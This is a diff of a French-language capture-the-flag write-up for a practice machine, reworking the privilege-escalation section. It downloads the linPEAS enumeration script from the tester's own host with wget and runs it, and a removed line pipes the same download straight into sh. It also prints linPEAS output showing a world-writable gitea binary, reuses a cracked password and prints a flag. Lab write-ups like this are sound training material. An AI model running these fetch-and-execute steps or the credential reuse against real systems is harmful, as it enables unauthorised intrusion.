@@ -360,18 +360,35 @@ wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
 sudo python3 -m http.server 80
 ```
 
-Par la suite, depuis le serveur, on va télécharger `linPEAS`:
+Par la suite, depuis le serveur, on va télécharger `linPEAS.sh`:
 ```bash
-curl 10.10.14.174/linpeas.sh | sh
+cd /tmp
+wget 10.10.14.174/linpeas.sh
+chmod +x linpeas.sh
 ```
 
-
-On semble pouvoir écrire sur le fichier gitea.
-En examinant les permissions sur le fichier, on dirait que junior a installé gitea mais a mal configuré les permissions:
+Puis, on va l'exécuter:
 ```bash
-www-data@greenhorn:/$ ls -la /usr/local/bin/gitea
-ls -la /usr/local/bin/gitea
--rwxrwxrwx 1 junior junior 138332624 Apr 16 03:44 /usr/local/bin/gitea
+./linpeas.sh
+....
+╔══════════╣ Analyzing .service files
+╚
+/etc/systemd/system/gitea.service is calling this writable executable: /usr/local/bin/gitea                                                                                                  
+/etc/systemd/system/multi-user.target.wants/gitea.service is calling this writable executable: /usr/local/bin/gitea
+
+╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
+╚
+132M -rwxrwxrwx 1 junior junior 132M Apr 16 03:44 /usr/local/bin/gitea
+                                                                                                                         
+╔══════════╣ Cleaned processes
+╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                  
+git         1090  0.1  4.2 2063276 168748 ?      Ssl  05:43   0:01 /usr/local/bin/gitea web --config /etc/gitea/app.ini
+```
+
+En examinant les permissions sur le fichier, on dirait que junior a installé gitea mais a mal configuré les permission.
+On semble pouvoir écrire sur le fichier `/usr/local/bin/gitea`, qui est lui appelé par le service `/etc/systemd/system/gitea.service`.
+```bash
+132M -rwxrwxrwx 1 junior junior 132M Apr 16 03:44 /usr/local/bin/gitea
 ```
 
 Puisque c'est lui qui a configuré gitea et que selon le commit c'est lui qui a uploadé le fichier `pass.php` que nous avons cracké plus tôt, on réessaye le même mot de passe, `iloveyou1`:
@@ -420,19 +437,3 @@ Using OpenVAS.pdf
 cat user.txt
 0dda172dbf48af3adec9fa5e73b7a090
 ```
-
-```bash
-╔══════════╣ Analyzing .service files
-╚
-/etc/systemd/system/gitea.service is calling this writable executable: /usr/local/bin/gitea                                                                                                  
-/etc/systemd/system/multi-user.target.wants/gitea.service is calling this writable executable: /usr/local/bin/gitea
-
-╔══════════╣ Binary processes permissions (non 'root root' and not belonging to current user)
-╚
-132M -rwxrwxrwx 1 junior junior 132M Apr 16 03:44 /usr/local/bin/gitea
-                                                                                                                         
-╔══════════╣ Cleaned processes
-╚ Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#processes                                                                  
-git         1090  0.1  4.2 2063276 168748 ?      Ssl  05:43   0:01 /usr/local/bin/gitea web --config /etc/gitea/app.ini
-```
-
